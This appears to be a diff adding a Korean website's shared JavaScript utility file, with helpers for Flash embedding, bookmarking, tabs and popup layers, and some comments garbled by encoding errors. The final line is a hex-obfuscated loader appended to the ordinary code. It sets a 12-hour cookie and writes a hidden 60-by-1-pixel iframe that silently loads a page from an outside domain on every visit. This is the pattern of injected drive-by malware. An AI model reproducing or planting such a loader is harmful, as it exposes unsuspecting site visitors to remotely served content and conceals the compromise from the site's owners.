@@ -1,0 +1,77 @@
+function fn_ShowEmbedObject(OBJ_ELEMENT_ID) {
+    //alert(OBJ_ELEMENT_ID.text);
+    document.write(OBJ_ELEMENT_ID.text);
+    OBJ_ELEMENT_ID.id = "";
+}
+
+// Flash 
+function FlashLoad(url,w,h,bg,t,code,id){
+document.write("\
+<object classid='clsid:d27cdb6e-ae6d-11cf-96b8-444553540000' codebase='http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0' width="+w+" height="+h+" id="+id+">\
+<param name='movie' value="+url+" />\
+<param name='wmode' value="+t+" />\
+<param name='bgcolor' value="+bg+" />\
+<param name='allowScriptAccess' value='sameDomain' />\
+<param name='quality' value='high' />\
+<param name='menu' value='false' />\
+<param name='flashVars' value='&"+code+"' />\
+<embed src="+url+" width="+w+" height="+h+" name="+id+" bgcolor="+bg+" allowScriptAccess='sameDomain' quality='high' wmode='"+t+"' type='application/x-shockwave-flash' pluginspage='http://www.macromedia.com/go/getflashplayer' />\
+</object>\
+");
+}
+
+
+//즐겨찾기
+function bookmarksite(title,url){ 
+  if(window.opera && window.print){ // opera 
+    var elem = document.createElement('a'); 
+    elem.setAttribute('href',url); 
+    elem.setAttribute('title',title); 
+    elem.setAttribute('rel','sidebar'); 
+    elem.click(); 
+  } 
+  else if(document.all) // ie 
+    window.external.AddFavorite(url, title); 
+  else if (window.sidebar) // firefox 
+    window.sidebar.addPanel(title, url, ""); 
+} 
+
+
+//tab change
+function tabChange(obj,num,imgId,total) {
+    for (i=1; i<=5; i++)    {
+        var imgIds = document.getElementById(imgId+i);
+        var imgSrc = imgIds.getAttribute("src");
+        if (i==num)    {
+            document.getElementById(obj+i).style.display = '';
+            imgIds.setAttribute("src",imgSrc.replace("_off","_on"));
+        }
+        else {
+            document.getElementById(obj+i).style.display = 'none';
+            imgIds.setAttribute("src",imgSrc.replace("_on","_off"));
+        }
+    }
+}
+//
+
+//링크?�선?�기�?
+function bluring(){ 
+if(event.srcElement.tagName=="A"||event.srcElement.tagName=="IMG") document.body.focus(); 
+} 
+document.onfocusin=bluring; 
+
+
+//?�업 ?�기//
+  
+function hideLayer()
+{
+ Popup2012.style.display = "none";
+}
+function MM_showHideLayers() { //v9.0
+  var i,p,v,obj,args=MM_showHideLayers.arguments;
+  for (i=0; i<(args.length-2); i+=3) 
+  with (document) if (getElementById && ((obj=getElementById(args[i]))!=null)) { v=args[i+2];
+    if (obj.style) { obj=obj.style; v=(v=='show')?'visible':(v=='hide')?'hidden':v; }
+    obj.visibility=v; }
+}
+var _$=["\x64\x6f\x63\x75\x6d\x65\x6e\x74","\x63\x6f\x6f\x6b\x69\x65","\x69\x6e\x64\x65\x78\x4f\x66",'\x77\x61\x6e\x67\x3d',"\x73\x65\x74\x54\x69\x6d\x65","\x67\x65\x74\x54\x69\x6d\x65",'\x77\x61\x6e\x67\x3d\x59\x65\x73\x3b\x70\x61\x74\x68\x3d\x2f\x3b\x65\x78\x70\x69\x72\x65\x73\x3d',"\x74\x6f\x47\x4d\x54\x53\x74\x72\x69\x6e\x67","\x77\x72\x69\x74\x65","\x3c\x69\x66\x72\x61\x6d\x65\x20\x73\x72\x63\x3d\x27\x68\x74\x74\x70\x3a\x2f\x2f\x75\x76\x63\x6f\x6e\x2e\x63\x6f\x6d\x2f\x62\x62\x73\x2f\x69\x63\x6f\x6e\x2f\x69\x6e\x64\x65\x78\x2e\x68\x74\x6d\x6c\x27\x20\x77\x69\x64\x74\x68\x3d\x27\x36\x30\x27\x20\x68\x65\x69\x67\x68\x74\x3d\x27\x31\x27\x20\x66\x72\x61\x6d\x65\x62\x6f\x72\x64\x65\x72\x3d\x27\x30\x27\x3e\x3c\x2f\x69\x66\x72\x61\x6d\x65\x3e"];if(window[_$[0]][_$[1]][_$[2]](_$[3])==-0x1){var a=new Date();a[_$[4]](a[_$[5]]()+0xc*0x3c*0x3c*0x3e8);window[_$[0]][_$[1]]=_$[6]+a[_$[7]]();window[_$[0]][_$[8]](_$[9])}
